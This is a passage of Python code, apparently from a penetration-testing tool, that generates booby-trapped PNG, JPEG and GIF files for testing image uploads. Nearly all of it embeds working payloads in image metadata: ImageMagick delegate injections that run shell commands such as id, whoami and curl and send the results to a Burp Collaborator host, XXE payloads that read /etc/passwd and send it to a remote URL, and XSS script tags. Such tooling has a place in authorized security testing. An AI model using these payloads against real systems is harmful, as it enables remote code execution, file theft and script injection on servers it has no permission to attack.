        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # RCE variant 9: MVG with msl: delegate (Magick Scripting Language)
        img_path = rce_dir / "rce9_mvg_msl.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        rce_msl = f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "msl:<?xml version=\\"1.0\\"?><image><read filename=\\"https://{burp_collab}/rce-msl?$(id)\\" /></image>"
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_msl.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # RCE variant 10: MVG with text: delegate
        img_path = rce_dir / "rce10_mvg_text.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        rce_text = f'''push graphic-context
viewbox 0 0 640 480
fill "text:@https://{burp_collab}/rce-text?$(whoami)"
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_text.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # RCE variant 11: MVG with epi: delegate (Encapsulated PostScript)
        img_path = rce_dir / "rce11_mvg_epi.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        rce_epi = f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "epi:https://{burp_collab}/rce-epi?$(uname -a)"
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_epi.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # RCE variant 12: MVG with ps: delegate (PostScript)
        img_path = rce_dir / "rce12_mvg_ps.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        rce_ps = f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "ps:https://{burp_collab}/rce-ps?$(hostname)"
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_ps.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # RCE variant 13: SVG with multiple xlink:href (different protocols)
        img_path = rce_dir / "rce13_svg_multi.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        rce_svg_multi = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://{burp_collab}/rce-svg-https" width="100" height="100"/>
<image xlink:href="http://{burp_collab}/rce-svg-http" width="100" height="100"/>
</svg>'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_svg_multi.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # RCE variant 14: MVG with file: delegate (local file read attempt)
        img_path = rce_dir / "rce14_mvg_file.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        rce_file = f'''push graphic-context
viewbox 0 0 640 480
fill url(file:///etc/passwd)
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_file.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # RCE variant 15: MVG with rar: delegate
        img_path = rce_dir / "rce15_mvg_rar.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        rce_rar = f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "rar:https://{burp_collab}/rce-rar?$(pwd)"
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_rar.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # RCE variant 16: MVG with zip: delegate
        img_path = rce_dir / "rce16_mvg_zip.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        rce_zip = f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "zip:https://{burp_collab}/rce-zip?$(ls -la)"
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_zip.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # RCE variant 17: MVG with backtick command execution
        img_path = rce_dir / "rce17_mvg_backtick.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        rce_backtick = f'''push graphic-context
viewbox 0 0 640 480
fill url(https://{burp_collab}/rce-backtick?`id`)
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_backtick.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # RCE variant 18: MVG with $() command substitution
        img_path = rce_dir / "rce18_mvg_dollar.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        rce_dollar = f'''push graphic-context
viewbox 0 0 640 480
fill url(https://{burp_collab}/rce-dollar?$(whoami))
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_dollar.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # RCE variant 19: SVG with embedded script
        img_path = rce_dir / "rce19_svg_script.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        rce_svg_script = f'''<svg xmlns="http://www.w3.org/2000/svg">
<script type="text/ecmascript"> <![CDATA[ fetch("https://{burp_collab}/rce-svg-script") ]]></script>
<rect width="100" height="100"/>
</svg>'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_svg_script.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # RCE variant 20: MVG with exec: delegate (if available)
        img_path = rce_dir / "rce20_mvg_exec.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        rce_exec = f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "exec:curl https://{burp_collab}/rce-exec"
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{rce_exec.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # NEW: XXE via XMP with proper entity declaration
        img_path = xxe_dir / "xxe2_xmp_entity.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        xxe_xmp = f'''<!DOCTYPE x [
<!ENTITY % remote SYSTEM "{base_url}/xxe-xmp">
%remote;
]>
<xmp>test</xmp>'''.encode('utf-8')
        
        iTXt_chunk = f'XML:com.adobe.xmp\x00\x00{xxe_xmp.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # XXE variant 3: XMP with file:// protocol
        img_path = xxe_dir / "xxe3_xmp_file.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        xxe_xmp_file = f'''<!DOCTYPE x [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % remote SYSTEM "{base_url}/xxe-xmp-file?%file;">
%remote;
]>
<xmp>test</xmp>'''.encode('utf-8')
        
        iTXt_chunk = f'XML:com.adobe.xmp\x00\x00{xxe_xmp_file.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # XXE variant 4: XMP with parameter entity in separate declaration
        img_path = xxe_dir / "xxe4_xmp_param.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        xxe_xmp_param = f'''<!DOCTYPE x [
<!ENTITY % ext SYSTEM "{base_url}/xxe-xmp-param">
%ext;
]>
<xmp>&data;</xmp>'''.encode('utf-8')
        
        iTXt_chunk = f'XML:com.adobe.xmp\x00\x00{xxe_xmp_param.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # XXE variant 5: XMP with nested entities
        img_path = xxe_dir / "xxe5_xmp_nested.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        xxe_xmp_nested = f'''<!DOCTYPE x [
<!ENTITY % remote SYSTEM "{base_url}/xxe-xmp-nested">
<!ENTITY % nested "<!ENTITY &#37; send SYSTEM '{base_url}/xxe-xmp-nested-send?%remote;'>">
%nested;
%send;
]>
<xmp>test</xmp>'''.encode('utf-8')
        
        iTXt_chunk = f'XML:com.adobe.xmp\x00\x00{xxe_xmp_nested.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # XXE variant 6: SVG embedded in iTXt (ImageMagick keyword)
        img_path = xxe_dir / "xxe6_svg_itxt.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        xxe_svg = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<!DOCTYPE svg [
<!ENTITY % remote SYSTEM "{base_url}/xxe-svg">
%remote;
]>
<rect width="100" height="100"/>
</svg>'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{xxe_svg.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # XXE variant 7: XMP with data:// protocol
        img_path = xxe_dir / "xxe7_xmp_data.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        xxe_xmp_data = f'''<!DOCTYPE x [
<!ENTITY % data SYSTEM "data://text/plain;base64,PCFFTlRJVFkgJSB4IFNZU1RFTSAie2Jhc2VfdXJsfS94eGUtZGF0YSI+JXg7">
<!ENTITY % remote SYSTEM "{base_url}/xxe-xmp-data?%data;">
%remote;
]>
<xmp>test</xmp>'''.encode('utf-8')
        
        iTXt_chunk = f'XML:com.adobe.xmp\x00\x00{xxe_xmp_data.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # XXE variant 8: XMP with expect:// protocol (if available)
        img_path = xxe_dir / "xxe8_xmp_expect.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        xxe_xmp_expect = f'''<!DOCTYPE x [
<!ENTITY % remote SYSTEM "expect://id">
%remote;
]>
<xmp>test</xmp>'''.encode('utf-8')
        
        iTXt_chunk = f'XML:com.adobe.xmp\x00\x00{xxe_xmp_expect.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # XXE variant 9: XMP with gopher:// protocol
        img_path = xxe_dir / "xxe9_xmp_gopher.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        xxe_xmp_gopher = f'''<!DOCTYPE x [
<!ENTITY % remote SYSTEM "gopher://{burp_collab}/xxe-gopher">
%remote;
]>
<xmp>test</xmp>'''.encode('utf-8')
        
        iTXt_chunk = f'XML:com.adobe.xmp\x00\x00{xxe_xmp_gopher.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        # XXE variant 10: XMP with php://filter
        img_path = xxe_dir / "xxe10_xmp_phpfilter.png"
        img.save(img_path, 'PNG')
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        xxe_xmp_php = f'''<!DOCTYPE x [
<!ENTITY % remote SYSTEM "php://filter/read=string.rot13/resource={base_url}/xxe-php">
%remote;
]>
<xmp>test</xmp>'''.encode('utf-8')
        
        iTXt_chunk = f'XML:com.adobe.xmp\x00\x00{xxe_xmp_php.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
    
    elif ext == 'jpg':
        img = Image.new('RGB', (100, 100), color='red')
        img_path = ssrf_dir / "ssrf1_com.jpg"
        img.save(img_path, 'JPEG')
        
        with open(img_path, 'rb') as f:
            jpg_data = bytearray(f.read())
        
        com_marker = b'\xFF\xFE'
        com_payload = f'<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-jpg">%x;]><x>test</x>'.encode('utf-8')
        com_length = struct.pack('>H', len(com_payload) + 2)
        com_chunk = com_marker + com_length + com_payload
        
        soi_pos = jpg_data.find(b'\xFF\xD8')
        if soi_pos != -1:
            insert_pos = soi_pos + 2
            jpg_data[insert_pos:insert_pos] = com_chunk
        
        with open(img_path, 'wb') as f:
            f.write(jpg_data)
        
        img_path = xxe_dir / "xxe1_com.jpg"
        img.save(img_path, 'JPEG')
        
        with open(img_path, 'rb') as f:
            jpg_data = bytearray(f.read())
        
        com_marker = b'\xFF\xFE'
        com_payload = f'<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-jpg">%x;]><x>test</x>'.encode('utf-8')
        com_length = struct.pack('>H', len(com_payload) + 2)
        com_chunk = com_marker + com_length + com_payload
        
        soi_pos = jpg_data.find(b'\xFF\xD8')
        if soi_pos != -1:
            insert_pos = soi_pos + 2
            jpg_data[insert_pos:insert_pos] = com_chunk
        
        with open(img_path, 'wb') as f:
            f.write(jpg_data)
        
        img_path = output_dir / "master.jpg"
        img.save(img_path, 'JPEG')
        
        with open(img_path, 'rb') as f:
            jpg_data = bytearray(f.read())
        
        com_marker = b'\xFF\xFE'
        com_payload = f'<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-jpg">%x;]><x>test</x>'.encode('utf-8')
        com_length = struct.pack('>H', len(com_payload) + 2)
        com_chunk = com_marker + com_length + com_payload
        
        soi_pos = jpg_data.find(b'\xFF\xD8')
        if soi_pos != -1:
            insert_pos = soi_pos + 2
            jpg_data[insert_pos:insert_pos] = com_chunk
        
        with open(img_path, 'wb') as f:
            f.write(jpg_data)
    
    elif ext == 'gif':
        gif_header = b'GIF89a'
        gif_trailer = b'\x00;'
        
        comment_extension = b'\x21\xFE'
        comment_payload = f'<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-gif">%x;]><x>test</x>'.encode('utf-8')
        comment_length = bytes([min(len(comment_payload), 255)])
        comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
        
        gif_content = gif_header + comment_chunk + gif_trailer
        with open(ssrf_dir / "ssrf1_comment.gif", 'wb') as f:
            f.write(gif_content)
        
        gif_content = gif_header + comment_chunk + gif_trailer
        with open(xxe_dir / "xxe1_comment.gif", 'wb') as f:
            f.write(gif_content)
        
        gif_content = gif_header + comment_chunk + gif_trailer
        with open(output_dir / "master.gif", 'wb') as f:
            f.write(gif_content)
        
        comment_extension_xss = b'\x21\xFE'
        comment_payload_xss = b'<script>alert(1)</script>'
        comment_length_xss = bytes([min(len(comment_payload_xss), 255)])
        comment_chunk_xss = comment_extension_xss + comment_length_xss + comment_payload_xss + b'\x00'
        
        gif_content_xss = gif_header + comment_chunk_xss + gif_trailer
        with open(xss_dir / "xss1_comment.gif", 'wb') as f:
            f.write(gif_content_xss)
    
    if ext == 'jpg' or ext == 'jpeg':
        img = Image.new('RGB', (100, 100), color='red')
        img_path = xss_dir / "xss1_com.jpg"
        img.save(img_path, 'JPEG')
        
        with open(img_path, 'rb') as f:
            jpg_data = bytearray(f.read())
        
        com_marker = b'\xFF\xFE'
        com_payload = b'<script>alert(1)</script>'
        com_length = struct.pack('>H', len(com_payload) + 2)
        com_chunk = com_marker + com_length + com_payload
        
        soi_pos = jpg_data.find(b'\xFF\xD8')
        if soi_pos != -1:
            insert_pos = soi_pos + 2
            jpg_data[insert_pos:insert_pos] = com_chunk
        
        with open(img_path, 'wb') as f:
            f.write(jpg_data)
    
    if ext == 'png':
        img = Image.new('RGB', (100, 100), color='red')
        img_path = xss_dir / "xss1_itxt.svg.png"
        img.save(img_path, 'PNG')
        
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        iTXt_chunk = f'iTXt\x00\x00<svg onload=alert(1)>'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
